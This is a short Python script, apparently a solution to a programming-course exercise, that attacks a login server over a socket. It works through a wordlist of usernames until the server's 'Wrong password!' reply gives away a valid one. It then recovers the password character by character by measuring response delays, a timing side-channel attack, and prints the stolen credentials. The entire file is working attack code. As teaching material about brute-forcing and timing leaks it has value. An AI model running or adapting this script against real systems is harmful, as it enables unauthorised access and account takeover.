# write your code here
import itertools
import json
import socket
import string
import sys
import time

with open('hacking/logins.txt', 'r') as file:
    logins = []
    for line in file:
        logins.append(line.strip('\n'))

with socket.socket() as client_socket:
    ip, port = sys.argv[1:]
    client_socket.connect((ip, int(port)))

    login = {}
    for user in logins:
        client_socket.send(json.dumps({'login': user, 'password': '12345'}).encode())
        response = json.loads(client_socket.recv(1024).decode())
        if response['result'] == 'Wrong password!':
            login['login'] = user
            break

    characters = string.ascii_letters + string.digits
    password = ''
    while True:
        for char in characters:
            start_time = time.time()
            client_socket.send(json.dumps({'login': user, 'password': f'{password}{char}'}).encode())
            response = json.loads(client_socket.recv(1024).decode())
            end_time = time.time()
            if end_time - start_time >= 0.1:
                password += char
                break
            if response['result'] == 'Connection success!':
                login['password'] = password + char
                print(json.dumps(login))
                exit()
